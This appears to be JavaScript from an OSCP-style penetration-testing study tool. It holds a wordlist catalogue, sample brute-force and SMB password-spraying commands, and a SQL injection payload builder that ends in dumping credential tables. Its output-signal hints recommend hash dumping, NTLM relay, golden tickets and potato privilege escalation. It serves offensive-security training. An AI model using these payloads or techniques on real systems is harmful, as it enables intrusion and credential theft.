    { task: 'dirs', name: 'raft-medium-directories', path: SL + 'Discovery/Web-Content/raft-medium-directories.txt', note: 'The reliable first sweep for directories. Start here on almost any web box.', tags: [] },
    { task: 'dirs', name: 'directory-list-2.3-medium', path: SL + 'Discovery/Web-Content/directory-list-2.3-medium.txt', note: 'The classic big list. Slower but thorough when raft finds little.', tags: [] },
    { task: 'dirs', name: 'common.txt', path: SL + 'Discovery/Web-Content/common.txt', note: 'Small and fast. Good for a quick first look or a slow target.', tags: [] },
    { task: 'dirs', name: 'IIS.fuzz.txt', path: SL + 'Discovery/Web-Content/IIS.fuzz.txt', note: 'IIS-specific paths. Reach for this when the server header says Microsoft-IIS.', tags: ['iis', 'windows', 'aspnet'] },
    { task: 'dirs', name: 'Common-DB-Backups', path: SL + 'Discovery/Web-Content/Common-DB-Backups.txt', note: 'Backups and DB dumps left in web roots. A frequent easy win.', tags: ['apache', 'php'] },
    // files / extensions
    { task: 'files', name: 'raft-medium-files', path: SL + 'Discovery/Web-Content/raft-medium-files.txt', note: 'Files rather than directories. Pair with the right -x extension for the stack.', tags: [] },
    { task: 'files', name: 'web-extensions', path: SL + 'Discovery/Web-Content/web-extensions.txt', note: 'A list of extensions to feed gobuster -x / ffuf. Match it to the stack (php, asp, aspx, jsp).', tags: [] },
    // CMS-specific
    { task: 'dirs', name: 'CMS/wordpress', path: SL + 'Discovery/Web-Content/CMS/wordpress.fuzz.txt', note: 'WordPress paths. Use wpscan too once you confirm WordPress.', tags: ['wordpress', 'php'] },
    // subdomains / vhosts
    { task: 'subdomains', name: 'subdomains-top1million-5000', path: SL + 'Discovery/DNS/subdomains-top1million-5000.txt', note: 'Fast subdomain / vhost sweep. Good default for ffuf -H "Host: FUZZ.target".', tags: [] },
    { task: 'subdomains', name: 'subdomains-top1million-110000', path: SL + 'Discovery/DNS/subdomains-top1million-110000.txt', note: 'The larger sweep when the small one finds nothing.', tags: [] },
    // usernames
    { task: 'users', name: 'xato-net-10-million-usernames', path: SL + 'Usernames/xato-net-10-million-usernames.txt', note: 'The go-to username list for spraying and brute force.', tags: [] },
    { task: 'users', name: 'top-usernames-shortlist', path: SL + 'Usernames/top-usernames-shortlist.txt', note: 'Tiny, high-hit list. Try this before the big one to avoid lockouts.', tags: [] },
    // passwords
    { task: 'passwords', name: 'rockyou.txt', path: '/usr/share/wordlists/rockyou.txt', note: 'The default password list. Cracking and web login brute force alike.', tags: [] },
    { task: 'passwords', name: 'probable-v2-top12000', path: SL + 'Passwords/Common-Credentials/probable-v2-top12000.txt', note: 'A focused list for spraying when rockyou is too big or lockout is a risk.', tags: [] },
    { task: 'passwords', name: 'default-passwords (SecLists)', path: SL + 'Passwords/Default-Credentials/default-passwords.csv', note: 'Vendor defaults. Try these first on appliances and admin panels.', tags: [] },
    // parameters
    { task: 'params', name: 'burp-parameter-names', path: SL + 'Discovery/Web-Content/burp-parameter-names.txt', note: 'Fuzz hidden GET/POST parameter names (ffuf ...?FUZZ=1).', tags: [] },
    // LFI / traversal
    { task: 'lfi', name: 'LFI-Jhaddix', path: SL + 'Fuzzing/LFI/LFI-Jhaddix.txt', note: 'Path-traversal and LFI payloads. Confirm with /etc/passwd or win.ini first.', tags: [] },
    { task: 'lfi', name: 'LFI-gracefulsecurity-linux', path: SL + 'Fuzzing/LFI/LFI-gracefulsecurity-linux.txt', note: 'Linux-focused interesting files to read once you have LFI.', tags: ['linux'] },
    // API
    { task: 'api', name: 'api/objects', path: SL + 'Discovery/Web-Content/api/objects.txt', note: 'Common API object names. Combine with /api/ and a version prefix.', tags: ['api', 'rest'] },
    { task: 'api', name: 'api/api-endpoints', path: SL + 'Discovery/Web-Content/api/api-endpoints.txt', note: 'Endpoint names for API discovery.', tags: ['api', 'rest'] },
  ];

  W.WORDLIST_TASKS = [
    { id: 'dirs', label: 'Directories' }, { id: 'files', label: 'Files' },
    { id: 'subdomains', label: 'Subdomains / VHosts' }, { id: 'users', label: 'Usernames' },
    { id: 'passwords', label: 'Passwords' }, { id: 'params', label: 'Parameters' },
    { id: 'lfi', label: 'LFI / Traversal' }, { id: 'api', label: 'API' },
  ];

  // Rank a task's lists, floating any whose tags match the detected stack to the top (stable otherwise).
  W.pickWordlists = function (task, stackTags) {
    stackTags = (stackTags || []).map(function (t) { return String(t).toLowerCase(); });
    var items = W.WORDLISTS.filter(function (w) { return w.task === task; });
    return items.map(function (w, i) {
      var match = w.tags.some(function (tg) { return stackTags.indexOf(tg) >= 0; });
      return { w: w, i: i, match: match };
    }).sort(function (a, b) {
      if (a.match !== b.match) return a.match ? -1 : 1;
      return a.i - b.i;
    }).map(function (x) { return Object.assign({ matched: x.match }, x.w); });
  };

  // A sample command for a task + wordlist, filled with the target when there is one. Presentation only:
  // these are learning scaffolds, not pack commands.
  W.wordlistCmd = function (task, path, target, ext) {
    var tgt = target || '<target>';
    switch (task) {
      case 'dirs': return 'gobuster dir -u http://' + tgt + '/ -w ' + path + (ext ? ' -x ' + ext : '') + ' -t 40';
      case 'files': return 'ffuf -u http://' + tgt + '/FUZZ -w ' + path + (ext ? ' -e ' + ext : '');
      case 'subdomains': return 'ffuf -u http://' + tgt + '/ -H "Host: FUZZ.' + tgt + '" -w ' + path + ' -fs 0';
      case 'users': return "nxc smb " + tgt + " -u " + path + " -p '' --continue-on-success";
      case 'passwords': return "nxc smb " + tgt + " -u bob -p " + path + " --continue-on-success";
      case 'params': return 'ffuf -u "http://' + tgt + '/page?FUZZ=1" -w ' + path + ' -fs 0';
      case 'lfi': return 'ffuf -u "http://' + tgt + '/index.php?page=FUZZ" -w ' + path + ' -fr "could not"';
      case 'api': return 'ffuf -u http://' + tgt + '/api/FUZZ -w ' + path;
      default: return path;
    }
  };

  // ── manual SQL injection builder ────────────────────────────────────────────────────────────
  // A guided, MANUAL builder: it writes the next payload from what you have learned, you run every query
  // yourself and paste the result back. No automation, no sqlmap, so it stays OSCP exam-legal. UNION-based
  // is the teaching spine, with error and time-based detection alongside. Covers the OSCP-common engines.
  var SQLI_DBMS = {
    mysql: {
      name: 'MySQL / MariaDB', comment: '-- -', version: '@@version', user: 'current_user()', db: 'database()',
      time: 'SLEEP(5)', castText: function (e) { return e; },
      concat: function (parts) { return 'concat_ws(0x3a,' + parts.join(',') + ')'; },
      rowsConcat: function (expr, from) { return "SELECT group_concat(" + expr + " SEPARATOR 0x0a) FROM " + from; },
      tablesFrom: "information_schema.tables WHERE table_schema=database()", tableNameCol: 'table_name',
      columnsFrom: function (t) { return "information_schema.columns WHERE table_name=0x" + hexLit(t); }, columnNameCol: 'column_name',
      note: 'Comment with -- - (note the trailing space) or #. Strings compare case-insensitively. 0x-hex avoids quotes inside a quoted context.',
    },
    mssql: {
      name: 'Microsoft SQL Server', comment: '-- ', version: '@@version', user: 'SYSTEM_USER', db: 'DB_NAME()',
      time: "WAITFOR DELAY '0:0:5'", castText: function (e) { return 'CAST(' + e + ' AS NVARCHAR(4000))'; },
      concat: function (parts) { return parts.map(function (p) { return 'CAST(' + p + ' AS NVARCHAR(4000))'; }).join("+':'+"); },
      rowsConcat: function (expr, from) { return "SELECT STRING_AGG(" + expr + ",CHAR(10)) FROM " + from; },
      tablesFrom: "information_schema.tables", tableNameCol: 'table_name',
      columnsFrom: function (t) { return "information_schema.columns WHERE table_name='" + t + "'"; }, columnNameCol: 'column_name',
      note: 'Comment with -- (two dashes, space). UNION columns often need CAST(... AS NVARCHAR). Stacked queries (; EXEC ...) are frequently possible, which opens xp_cmdshell.',
    },
    postgres: {
      name: 'PostgreSQL', comment: '-- ', version: 'version()', user: 'current_user', db: 'current_database()',
      time: 'pg_sleep(5)', castText: function (e) { return '(' + e + ')::text'; },
      concat: function (parts) { return parts.map(function (p) { return '(' + p + ')::text'; }).join("||':'||"); },
      rowsConcat: function (expr, from) { return "SELECT string_agg(" + expr + ",E'\\n') FROM " + from; },
      tablesFrom: "information_schema.tables WHERE table_schema='public'", tableNameCol: 'table_name',
      columnsFrom: function (t) { return "information_schema.columns WHERE table_name='" + t + "'"; }, columnNameCol: 'column_name',
      note: 'Comment with -- (space). Concatenate with ||, cast to ::text so UNION types line up. pg_sleep for time-based.',
    },
    sqlite: {
      name: 'SQLite', comment: '-- ', version: 'sqlite_version()', user: null, db: null,
      time: null, castText: function (e) { return e; },
      concat: function (parts) { return parts.join("||':'||"); },
      rowsConcat: function (expr, from) { return "SELECT group_concat(" + expr + ",x'0a') FROM " + from; },
      tablesFrom: "sqlite_master WHERE type='table'", tableNameCol: 'name',
      columnsFrom: null, columnNameCol: null,
      note: 'Often behind a web app. No current user or database. List tables from sqlite_master; read a table schema with: UNION SELECT sql FROM sqlite_master WHERE name=... . No time-based sleep.',
    },
  };
  function hexLit(s) { return W.hexEnc(s); }
  W.SQLI_DBMS = SQLI_DBMS;
  W.sqliDbmsList = function () { return Object.keys(SQLI_DBMS).map(function (k) { return { id: k, name: SQLI_DBMS[k].name }; }); };

  function colList(n, markers) {
    var a = [];
    for (var i = 1; i <= n; i++) a.push(markers && markers[i] !== undefined ? markers[i] : i);
    return a.join(',');
  }

  // Build the ordered phases for the current state. Progressive: later phases appear as you fill in what
  // each step reveals. state = {dbms, ctx:'string'|'numeric', cols:int, vis:int, table:string}.
  W.sqliBuild = function (state) {
    state = state || {};
    var d = SQLI_DBMS[state.dbms] || SQLI_DBMS.mysql;
    var ctx = state.ctx === 'numeric' ? 'numeric' : 'string';
    var q = ctx === 'string' ? "'" : '';      // break out of the quoted string
    var c = d.comment;
    var phases = [];

    // 1. Detect
    var detect = { key: 'detect', title: '1. Confirm The Injection', note: 'Run each and watch the response. A difference between true and false (or an error, or a delay) confirms it.', items: [] };
    detect.items.push({ label: 'Break it (look for an error)', payload: q });
    detect.items.push({ label: 'Always true', payload: q + ' OR 1=1' + c });
    detect.items.push({ label: 'Always false', payload: q + ' OR 1=2' + c });
    if (d.time) detect.items.push({ label: 'Time-based (delays ~5s if injectable)', payload: q + ' OR ' + d.time + c });
    phases.push(detect);

    // 2. Column count
    phases.push({ key: 'cols', title: '2. Count The Columns', note: 'Increase the number until the page errors. The last number that WORKS is your column count. Then type it below.', items: [
      { label: 'ORDER BY probe (raise N until it breaks)', payload: q + ' ORDER BY 1' + c },
      { label: 'Or add NULLs until the page is normal', payload: q + ' UNION SELECT NULL' + c },
    ] });

    // 3. Visible column (needs cols)
    if (state.cols > 0) {
      phases.push({ key: 'vis', title: '3. Find A Visible Column', note: 'Run this. Whichever number shows up on the page is a column you can read from. Type that position below.', items: [
        { label: 'UNION with ' + state.cols + ' columns', payload: q + ' UNION SELECT ' + colList(state.cols) + c },
      ] });
    }

    // 4. Fingerprint / DB info (needs cols + vis)
    if (state.cols > 0 && state.vis > 0) {
      function unionWith(expr) {
        var markers = {}; markers[state.vis] = d.castText(expr);
        return q + ' UNION SELECT ' + colList(state.cols, markers) + c;
      }
      var info = { key: 'info', title: '4. Read The Basics', note: 'Place each value in the visible column. This confirms the engine and your privileges.', items: [] };
      info.items.push({ label: 'Version', payload: unionWith(d.version) });
      if (d.user) info.items.push({ label: 'Current user', payload: unionWith(d.user) });
      if (d.db) info.items.push({ label: 'Current database', payload: unionWith(d.db) });
      phases.push(info);

      // 5. Tables
      var tExpr = d.rowsConcat(d.tableNameCol, d.tablesFrom);
      phases.push({ key: 'tables', title: '5. List The Tables', note: 'This pulls every table name into the visible column at once. Pick a juicy one (users, accounts) and type it below.', items: [
        { label: 'All tables in this database', payload: q + ' UNION SELECT ' + colList(state.cols, markerAt(state.vis, '(' + tExpr + ')')) + c },
      ] });

      // 6 + 7. Columns and dump (needs table)
      if (state.table) {
        if (d.columnsFrom) {
          var cExpr = d.rowsConcat(d.columnNameCol, d.columnsFrom(state.table));
          phases.push({ key: 'columns', title: '6. List That Table’s Columns', note: 'The column names in ' + state.table + '. Note the ones you want (username, password), then build the dump.', items: [
            { label: 'Columns of ' + state.table, payload: q + ' UNION SELECT ' + colList(state.cols, markerAt(state.vis, '(' + cExpr + ')')) + c },
          ] });
        }
        var dumpExpr = d.rowsConcat(d.concat(['username', 'password']), state.table);
        phases.push({ key: 'dump', title: '7. Dump The Data', note: 'Replace username,password with the real column names you found. This reads the rows into the visible column.', items: [
          { label: 'Dump ' + state.table + ' (edit the column names)', payload: q + ' UNION SELECT ' + colList(state.cols, markerAt(state.vis, '(' + dumpExpr + ')')) + c },
        ] });
      }
    }
    return { dbms: d, phases: phases };
  };
  function markerAt(pos, expr) { var m = {}; m[pos] = expr; return m; }

  // ── explain this output (parser annotate mode) ──────────────────────────────────────────────
  // After the real parsers mint facts from a paste, obol shows WHICH lines produced each fact, what the
  // fact proves in plain language, and what it does NOT prove. The parsers carry no line numbers, so we
  // match each fact's distinctive values back onto the lines. Honest by construction: it annotates the
  // real facts the engine minted, it never invents one.
  var FACT_EXPLAIN = {
    'port:': { proves: 'This port is open and was reachable when you scanned.', caveat: 'It does not prove which service truly runs there, or that it is exploitable. Confirm the service with a version scan.' },
    'ports.open': { proves: 'These TCP ports answered the scan.', caveat: 'Open is not vulnerable. The work is deciding which one is the way in.' },
    'service.': { proves: 'A service of this type was identified on the host.', caveat: 'The banner can lie or be out of date. Verify the version before trusting an exploit to it.' },
    'ldap.reachable': { proves: 'LDAP answered, so this is almost certainly a domain controller.', caveat: 'It does not prove you can read anything without credentials. Try an anonymous bind next.' },
    'smb.': { proves: 'SMB responded with this detail.', caveat: 'A readable share or a null session is a lead, not loot. Check what you can actually access.' },
    'ad.domain_known': { proves: 'You have confirmed the domain name.', caveat: 'Knowing the domain is not access to it. You still need a credential or a roastable account.' },
    'credential.available': { proves: 'This credential was validated against a service, it works.', caveat: 'It works HERE. The same password may be reused elsewhere, or may not. Spray carefully to avoid lockout.' },
    'credential.plaintext': { proves: 'You hold a cleartext password for this account.', caveat: 'Holding it is not the same as it being valid now. Validate it before you rely on it.' },
    'credential.candidate': { proves: 'A possible username or password was observed.', caveat: 'Unvalidated. It is a guess until a service accepts it. Do not assume it works.' },
    'hash.ntlm': { proves: 'You recovered an NTLM hash for this account.', caveat: 'You can often pass-the-hash with it directly, no cracking needed. Cracking only matters if you need the cleartext (reuse).' },
    'hash.asrep': { proves: 'An AS-REP roastable hash: this account does not require Kerberos pre-auth.', caveat: 'The hash is not the password. Crack it offline (it is RC4, fast) to get the cleartext.' },
    'hash.tgs': { proves: 'A Kerberoast hash for a service account.', caveat: 'Still needs cracking offline. Service accounts often have weak passwords, which is why this is worth the time.' },
    'foothold.': { proves: 'You have code execution or a shell on this host.', caveat: 'A foothold is the start, not the flag. Stabilize it, orient, then look to escalate.' },
    'access.shell': { proves: 'You have an interactive shell.', caveat: 'It may be an unstable or limited shell. Upgrade the PTY and confirm who you are before trusting it.' },
    'access.admin': { proves: 'You have administrative or root access on this host.', caveat: 'Local admin is not domain admin. Grab the proof, then see what this access unlocks next.' },
    'privesc.sudo_binary': { proves: 'You can run this binary via sudo.', caveat: 'Only useful if the binary has a known escape (check GTFOBins). Many sudo rights are harmless.' },
    'privesc.suid_candidate': { proves: 'This binary is SUID, so it runs as its owner.', caveat: 'The stock SUID files are expected and safe. Only a non-standard one is a real lead.' },
    'web.': { proves: 'This was observed about the web application.', caveat: 'An observation is not a vulnerability. Confirm it does something before chasing it.' },
    'host.': { proves: 'This was learned about the host.', caveat: 'Context, not access. Use it to aim the next step.' },
  };
  function explainKind(kind) {
    if (FACT_EXPLAIN[kind]) return FACT_EXPLAIN[kind];
    var keys = Object.keys(FACT_EXPLAIN);
    for (var i = 0; i < keys.length; i++) { if (keys[i].slice(-1) === ':' || keys[i].slice(-1) === '.') { if (kind.indexOf(keys[i]) === 0) return FACT_EXPLAIN[keys[i]]; } }
    return { proves: 'OBOL minted a fact from this line.', caveat: 'Read it as a lead to weigh, not a guarantee. The Cockpit ranks what it unlocks.' };
  }
  W.explainKind = explainKind;

  // Distinctive string needles from a fact's value, used to find the lines that produced it.
  function factNeedles(fact) {
    var out = [], seen = {};
    function push(v) {
      if (v == null) return;
      var s = String(v).trim();
      if (s.length < 2 || s.length > 120) return;
      if (/^(true|false|null|undefined|yes|no)$/i.test(s)) return;
      if (seen[s]) return; seen[s] = 1; out.push(s);
    }
    function walk(v, depth) {
      if (depth > 3 || v == null) return;
      if (Array.isArray(v)) { v.forEach(function (x) { walk(x, depth + 1); }); return; }
      if (typeof v === 'object') { Object.keys(v).forEach(function (k) { walk(v[k], depth + 1); }); return; }
      push(v);
    }
    // a port:NNN kind carries its number in the kind itself
    var m = String(fact.kind || '').match(/^port:(\d+)$/);
    if (m) push(m[1]);
    walk(fact.value, 0);
    return out;
  }
  W.factNeedles = factNeedles;

  // Annotate: for each line, which facts it produced; for each fact, its lines + plain explanation.
  W.annotateOutput = function (text, facts) {
    var rawLines = String(text == null ? '' : text).split('\n');
    var lineLc = rawLines.map(function (l) { return l.toLowerCase(); });
    var lineHits = rawLines.map(function () { return []; });
    function matcher(needle) {
      // A number (a port, a RID) must match as a whole token, so "22" does not light up "2.4.41" or
      // "0.0.22x". Text needles (hostnames, hashes, share names) match as substrings.
      if (/^\d+$/.test(needle)) {
        var re = new RegExp('(^|[^0-9.])' + needle + '([^0-9.]|$)');
        return function (lineLcStr, lineRaw) { return re.test(lineRaw); };
      }
      var nl = needle.toLowerCase();
      return function (lineLcStr) { return lineLcStr.indexOf(nl) >= 0; };
    }
    var annotated = (facts || []).map(function (f, fi) {
      var needles = factNeedles(f), lineNos = [], seenLn = {};
      needles.forEach(function (n) {
        var test = matcher(n);
        for (var i = 0; i < lineLc.length; i++) {
          if (lineLc[i] && test(lineLc[i], rawLines[i])) {
            if (!seenLn[i]) { seenLn[i] = 1; lineNos.push(i); }
            if (lineHits[i].indexOf(fi) < 0) lineHits[i].push(fi);
          }
        }
      });
      lineNos.sort(function (a, b) { return a - b; });
      return { index: fi, kind: f.kind, lineNos: lineNos, explain: explainKind(f.kind) };
    });
    return {
      lines: rawLines.map(function (t, i) { return { text: t, factIdxs: lineHits[i] }; }),
      facts: annotated,
    };
  };

  // ── lockout-aware spray planner ─────────────────────────────────────────────────────────────
  // Password spraying locks accounts when it crosses the domain lockout threshold. This turns the
  // policy (threshold + observation window) into a safe plan: how many passwords per round, how long to
  // wait, and the total time, with a margin so you never actually reach the threshold. Pure arithmetic.
  W.sprayPlan = function (opts) {
    opts = opts || {};
    var threshold = parseInt(opts.threshold, 10);
    var windowMin = parseFloat(opts.windowMin);
    var passwords = parseInt(opts.passwords, 10);
    var margin = (opts.margin == null || isNaN(parseInt(opts.margin, 10))) ? 1 : parseInt(opts.margin, 10);
    if (isNaN(passwords) || passwords < 1) passwords = 1;

    var warnings = [];
    // threshold 0 means "no lockout" in Windows policy.
    if (threshold === 0) {
      return { ok: true, noLockout: true, passwords: passwords, warnings: ['Lockout threshold is 0, so accounts never lock. You can spray freely, but still avoid hammering, which is noisy.'] };
    }
    if (isNaN(threshold) || threshold < 1) return { ok: false, warnings: ['Enter the lockout threshold (the bad-password count that locks an account).'] };
    if (isNaN(windowMin) || windowMin <= 0) return { ok: false, warnings: ['Enter the observation window in minutes (how long the bad-password count takes to reset).'] };

    var safePerWindow = threshold - margin;
    if (safePerWindow < 1) {
      return { ok: false, safePerWindow: safePerWindow,
        warnings: ['A threshold of ' + threshold + ' with a margin of ' + margin + ' leaves no safe attempts. Lower the margin to 1, or spray a single, very likely password only (and even then, carefully).'] };
    }
    var rounds = Math.ceil(passwords / safePerWindow);
    var totalMinutes = (rounds - 1) * windowMin;   // wait the window BETWEEN rounds, not after the last
    if (margin < 1) warnings.push('A margin of 0 means you spray right up to the threshold. One retry, one failed sync, or one stale attempt, and an account locks. Use at least 1.');
    if (safePerWindow === 1) warnings.push('Only one attempt per window is safe here. Spray your single best guess first; the full list will take a long time.');

    return {
      ok: true, noLockout: false,
      threshold: threshold, windowMin: windowMin, margin: margin, passwords: passwords,
      safePerWindow: safePerWindow, rounds: rounds, totalMinutes: totalMinutes,
      warnings: warnings,
    };
  };

  // Minutes to a friendly "2h 30m" style string.
  W.fmtDuration = function (min) {
    min = Math.round(min);
    if (min <= 0) return '0m';
    var h = Math.floor(min / 60), m = min % 60;
    return (h ? h + 'h ' : '') + (m || !h ? m + 'm' : '').trim();
  };

  // ── value-aware fact explanation ────────────────────────────────────────────────────────────
  // explainKind (above) is a generic per-kind fallback. explainFact reads the fact's ACTUAL value and
  // says something specific and actionable: the real OS string, the domain and its base DN, which
  // binary is SUID, whose hash was dumped. This is what keeps Explain Output from reading as boilerplate.
  function baseDn(d) { return String(d || '').split('.').filter(Boolean).map(function (p) { return 'DC=' + p; }).join(','); }
  W.explainFact = function (f) {
    f = f || {}; var k = String(f.kind || ''), v = f.value || {};
    if (k === 'host.os_hint' || k === 'host.os_family' || k === 'os.windows' || k === 'os.linux') {
      var os = v.os || v.name || v.family || v.version || '';
      var fam = /^(windows|linux|unix|macos|bsd)$/i.test(os);  // a bare family word, not a full version string
      var proves = os ? (fam ? ('The target is a ' + os.charAt(0).toUpperCase() + os.slice(1).toLowerCase() + ' host.') : ('The target is running ' + os + '.')) : 'The target operating system was fingerprinted.';
      return { proves: proves, caveat: 'Use the version and build to aim patch-level and kernel-LPE checks. This is context, not access.' };
    }
    if (k === 'host.hostname') return { proves: 'The host is named ' + (v.name || v.hostname || '(this host)') + '.', caveat: 'A name, not access. On a DC it doubles as the NetBIOS name Kerberos needs.' };
    if (k === 'host.domain' || k === 'ad.domain_known') {
      var d = v.name || v.domain || '';
      return { proves: d ? ('The domain is ' + d + '.') : 'The domain name was confirmed.',
        caveat: d ? ('Your base DN is ' + baseDn(d) + '. Knowing the domain is not access to it: you still need a credential or a roastable account.') : 'Knowing the domain is not access to it.' };
    }
    if (k === 'ad.base_dn') return { proves: 'The LDAP base DN is ' + (v.base_dn || v.basedn || '') + '.', caveat: 'Use it to scope ldapsearch and nxc LDAP queries.' };
    if (k.indexOf('port:') === 0) {
      var port = k.split(':')[1], svc = v.service || '';
      return { proves: 'Port ' + port + ' is open' + (svc ? (' (' + svc + ')') : '') + '.', caveat: 'Open is not vulnerable. Fingerprint the version, then decide if it is the way in.' };
    }
    if (k.indexOf('service.') === 0) return { proves: 'A ' + k.slice(8).toUpperCase() + ' service is present on the host.', caveat: 'The banner can lie or be out of date. Verify the version before trusting an exploit to it.' };
    if (k === 'hash.ntlm') return { proves: 'An NTLM hash for ' + (v.user || 'an account') + ' was recovered.', caveat: 'You can pass-the-hash with the NT half directly, no cracking needed. Crack only if you need the cleartext for reuse.' };
    if (k === 'hash.asrep') return { proves: 'An AS-REP roastable hash' + (v.count ? (' (x' + v.count + ')') : '') + ' was captured.', caveat: 'The account has pre-auth disabled. Crack it offline, hashcat -m 18200 (RC4, fast).' };
    if (k === 'hash.tgs') return { proves: 'A Kerberoast hash' + (v.count ? (' (x' + v.count + ')') : '') + ' was captured.', caveat: 'Crack it offline, hashcat -m 13100. Service accounts often have weak passwords.' };
    if (k === 'hash.krbtgt') return { proves: 'The krbtgt account hash was recovered.', caveat: 'This is the golden-ticket key. You effectively own the domain: forge a TGT for any user.' };
    if (k === 'credential.available') return { proves: (v.user ? (v.user + "'s") : 'A') + ' credential validated against a service, it works here.', caveat: 'It works HERE. Spray it elsewhere carefully (mind the lockout policy); reuse is common but not guaranteed.' };
    if (k === 'credential.plaintext') return { proves: 'A cleartext password for ' + (v.user || 'an account') + '.', caveat: 'Holding it is not the same as it being valid now. Validate it before you rely on it.' };
    if (k === 'credential.candidate') return { proves: 'A possible credential' + (v.user ? (' for ' + v.user) : '') + ' was observed.', caveat: 'Unvalidated, a guess until a service accepts it. Do not assume it works.' };
    if (k === 'privesc.sudo_binary') return { proves: 'You can run ' + (v.bin || 'a binary') + ' via sudo.', caveat: 'Useful only if GTFOBins has an escape for it. Check the GTFOBins tab; many sudo rights are harmless.' };
    if (k === 'privesc.suid_candidate') return { proves: 'SUID binaries were found: ' + ((v.paths || []).join(', ') || '(see output)') + '.', caveat: 'The stock SUID files are expected. Only a non-standard one is a real lead.' };
    if (k.indexOf('foothold.') === 0 || k === 'access.shell') return { proves: 'You have code execution or a shell on this host.', caveat: 'A foothold is the start. Stabilize it, orient (id / whoami), then look to escalate.' };
    if (k === 'access.admin' || k === 'access.system' || k === 'access.root') return { proves: 'You have administrative or root access on this host.', caveat: 'Local admin is not domain admin. Grab the proof, then see what this access unlocks next.' };
    if (k === 'smb.null_session' || k === 'smb.anonymous') return { proves: 'An anonymous (null) SMB session is allowed.', caveat: 'Enumerate with no credentials: RID cycling, shares, and the password policy.' };
    if (k.indexOf('smb.') === 0) return { proves: 'SMB revealed this detail.', caveat: 'A readable share or a null session is a lead, not loot. Check what you can actually access.' };
    if (k === 'ldap.reachable') return { proves: 'LDAP answered, so this is almost certainly a domain controller.', caveat: 'It does not prove you can read anything. Try an anonymous bind next.' };
    return explainKind(k);
  };

  // ── output signal scan (the "what stands out" layer) ─────────────────────────────────────────
  // The parser mints facts, but a lot of the gold is in the raw line itself (signing:True, SMBv1:True,
  // Null Auth:True, STATUS_ACCESS_DENIED, a Kerberos error). This scans the pasted output for those
  // high-value signals and, for each, says what it means and the concrete next move. Ordered, deduped.
  function sig(id, re, tone, label, meaning, next) { return { id: id, re: re, tone: tone, label: label, meaning: meaning, next: next }; }
  var OUTPUT_SIGNALS = [
    sig('pwned', /\(Pwn3d!\)|Pwn3d!/, 'win', 'Administrative access (Pwn3d!)', 'This credential is local admin on this host.', 'Dump the local hashes (--sam / --lsa) or get a SYSTEM shell. On a DC, go for the domain (--ntds or DCSync).'),
    sig('signoff', /signing\s*[:=]\s*False/i, 'win', 'SMB signing is OFF', 'This host accepts a relayed NTLM authentication.', 'Add it to your relay target list and relay a coerced auth here (ntlmrelayx).'),
    sig('signon', /signing\s*[:=]\s*True/i, 'info', 'SMB signing is required', 'An NTLM relay will not work against this host.', 'Skip the relay here. Crack or pass the hash instead, or relay to a signing-off host.'),
    sig('smbv1', /SMBv1\s*[:=]\s*True/i, 'warn', 'SMBv1 is enabled', 'Legacy SMBv1 often means an unpatched host.', 'Check MS17-010 (EternalBlue) if it is in scope.'),
    sig('nullauth', /Null\s*Auth\s*[:=]\s*True/i, 'win', 'Anonymous (null) SMB auth is allowed', 'You can talk to SMB with no credentials.', 'RID-cycle for users, list shares, and read the password policy, all unauthenticated.'),
    sig('sharesdenied', /enumerating shares:\s*STATUS_ACCESS_DENIED/i, 'info', 'Shares could not be listed (ACCESS_DENIED)', 'The session connected but is too limited to list shares.', 'Try RID or LDAP enumeration anonymously, or come back with a credential.'),
    sig('logonfail', /STATUS_LOGON_FAILURE/i, 'warn', 'The credential was rejected (LOGON_FAILURE)', 'Wrong password, or the account is not valid on this host.', 'Re-check the username, the domain, and whether it is a local vs domain account.'),
    sig('locked', /STATUS_ACCOUNT_LOCKED_OUT|account (?:is |has been )?locked/i, 'warn', 'An account is locked out', 'A spray or brute crossed the lockout threshold.', 'Stop. Read the lockout policy and wait out the window (use the Spray Planner).'),
    sig('pwexpired', /STATUS_PASSWORD_EXPIRED|STATUS_PASSWORD_MUST_CHANGE/i, 'info', 'The password is expired', 'The credential is valid but must be changed before use.', 'Change it over SMB (the account-password-change move) and keep going.'),
    sig('asrep', /\$krb5asrep\$/, 'win', 'An AS-REP hash was captured', 'An account with Kerberos pre-auth disabled was roasted.', 'Crack it offline (hashcat -m 18200). Confirm the mode in Hash ID.'),
    sig('tgs', /\$krb5tgs\$/, 'win', 'A Kerberoast hash was captured', 'A service account ticket was roasted.', 'Crack it offline (hashcat -m 13100).'),
    sig('ntds', /[0-9a-fA-F]{32}:[0-9a-fA-F]{32}:::/, 'win', 'NTLM hashes were dumped', 'Accounts are in pwdump form (user:rid:lm:nt:::).', 'Pass-the-hash with the NT half, or crack it. Identify it in Hash ID.'),
    sig('vuln', /\bVULNERABLE\b/, 'win', 'A check reported VULNERABLE', 'An NSE script or scanner flagged a known weakness.', 'Verify it yourself before trusting it, then line up the matching exploit.'),
    sig('skew', /KRB_AP_ERR_SKEW|clock skew too great/i, 'warn', 'Kerberos clock skew', 'Your clock is too far from the DC for Kerberos.', 'Sync to the DC and retry (fix-clock-skew).'),
    sig('spnunknown', /KDC_ERR_S_PRINCIPAL_UNKNOWN|PRINCIPAL_UNKNOWN/i, 'warn', 'Kerberos principal unknown', 'The SPN or name is wrong, or you used an IP.', 'Use the exact FQDN or SPN, not an IP (kerberos-spn-fix).'),
    sig('os', /(Windows(?:\s+Server)?\s+\d{4}[^)\n]*?\b\d{4,5}\b)/i, 'info', null, 'The exact OS and build date the host.', 'Note the build for patch-level and kernel-LPE triage.'),
    sig('localport', /(?:127\.0\.0\.1|\[::1\]):(\d{2,5})\b.*(?:LISTEN|LISTENING)/i, 'win', 'Internal localhost-only service listening', 'A service is bound to 127.0.0.1 and hidden from external scans.', 'Forward this port to Kali using the Pivot & Tunnel Builder (SSH -L or Chisel).'),
    sig('internalnic', /\b(172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b/, 'win', 'Secondary internal network interface detected', 'This host is dual-homed or connected to an internal subnet.', 'Use the Pivot & Tunnel Builder (Ligolo-ng or Chisel SOCKS5) to route into the internal subnet.'),
    sig('seimpersonate', /SeImpersonatePrivilege.*(?:Enabled|Disabled)|SeAssignPrimaryTokenPrivilege/i, 'win', 'Token impersonation privilege (SeImpersonate / SeAssignPrimaryToken)', 'Service accounts with this privilege can escalate directly to NT AUTHORITY\\SYSTEM.', 'Run GodPotato, PrintSpoofer, or JuicyPotatoNG to spawn a SYSTEM shell.'),
